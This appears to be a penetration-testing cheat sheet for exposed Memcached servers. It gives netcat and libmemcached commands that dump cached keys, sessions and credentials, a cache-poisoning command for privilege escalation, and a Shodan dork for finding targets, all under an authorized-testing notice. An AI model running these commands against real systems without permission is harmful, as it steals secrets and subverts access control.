---
service: memcached
title: Memcached
ports: 11211
aliases: memcache
---

# Memcached — quick wins

**When you see it:** 11211/tcp open and `echo "version" | nc -w1 H 11211` returns a
`VERSION` string with no auth challenge → unauthenticated, full key/value read. Memcached
supports SASL but almost no production deployment enables it.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the target — get
> sign-off before touching cache contents.

## Triage (read-only)
```sh
echo "version"    | nc -w1 H 11211   # confirm service + version
echo "stats"      | nc -w1 H 11211   # uptime, connections, bytes in use
echo "stats slabs"| nc -w1 H 11211   # slab classes with active items
echo "stats items"| nc -w1 H 11211   # item counts per slab class (look for non-zero)
```

## Quick wins

### Dump all keys and values
```sh
# 1. Find active slab IDs from "stats items" — note each <slab_id>
echo "stats cachedump <slab_id> 0" | nc -w1 H 11211   # 0 = unlimited keys
# 2. Retrieve a key
echo "get <KEY>" | nc -w1 H 11211
```
*Why:* `cachedump` lists every key in a slab class; `get` retrieves the raw value. Sessions,
tokens, serialised objects, and plaintext credentials often live here.

### Bulk dump with libmemcached
```sh
# install: apt install libmemcached-tools
memcstat  --servers=H            # server stats
memcdump  --servers=H            # all key names
memccat   --servers=H <KEY>      # value for a specific key
```
*Why:* faster than manual netcat loops; `memcdump` handles multi-slab iteration
automatically.

### nmap enumeration
```sh
nmap -n -sV --script memcached-info -p 11211 H
```
*Why:* version, platform, and stats in one pass without netcat.

### Cache poisoning ✏️
```sh
# Replace an existing key's value (TTL in seconds; 0 = no expiry)
printf "set <KEY> 0 0 <len>\r\n<NEW_VALUE>\r\n" | nc -w1 H 11211
```
*Why:* if the application trusts cached values for auth decisions (e.g. `is_admin`, session
roles), overwriting the key can escalate privilege without touching the database. Requires
knowing the key name from the dump step above.

## aranum helpers
- `enum-memcached.sh` — the dispatcher that produced the finding (version, stats, key
  sample).

## Gotchas
- Data is volatile — keys appear and disappear between requests; run dumps quickly after
  confirming activity in `stats items`.
- UDP port 11211 is often open even when TCP is firewalled; `nc -u` works for stats but
  is unreliable for multi-packet responses.
- `stats cachedump` is disabled on some hardened builds (returns `CLIENT_ERROR`); use
  `memcdump` from libmemcached-tools as a fallback.
- SASL auth (rare) shows up as `ERROR` on raw commands — move on if you see it.
- Default max item size is 1 MB; values silently truncate if the stored object is larger.

## Sources
- HackTricks `11211-memcache` (ivanversluis/pentest-hacktricks mirror); libmemcached-tools
  man pages; Shodan dork `port:11211 "STAT pid"`.
